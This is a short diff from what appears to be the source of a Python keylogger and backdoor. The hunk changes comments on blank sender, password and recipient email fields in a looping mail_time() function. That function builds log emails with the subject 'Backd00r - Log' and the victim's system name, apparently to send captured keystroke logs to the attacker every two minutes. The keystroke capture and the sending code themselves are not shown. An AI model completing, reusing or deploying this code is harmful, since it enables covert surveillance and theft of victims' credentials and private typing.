@@ -10,11 +10,11 @@ def mail_time():
     while True:
         time.sleep(120)
 
-        email_user = '' # from who
-        email_password = '' # pass
+        email_user = '' # edit, email
+        email_password = '' # edit, pass
 
         
-        email_send = '' # which mail
+        email_send = '' # send to this mail
 
 
         subject = 'Backd00r - Log | ' + keyloggerskill.keylogger().system_name_go()
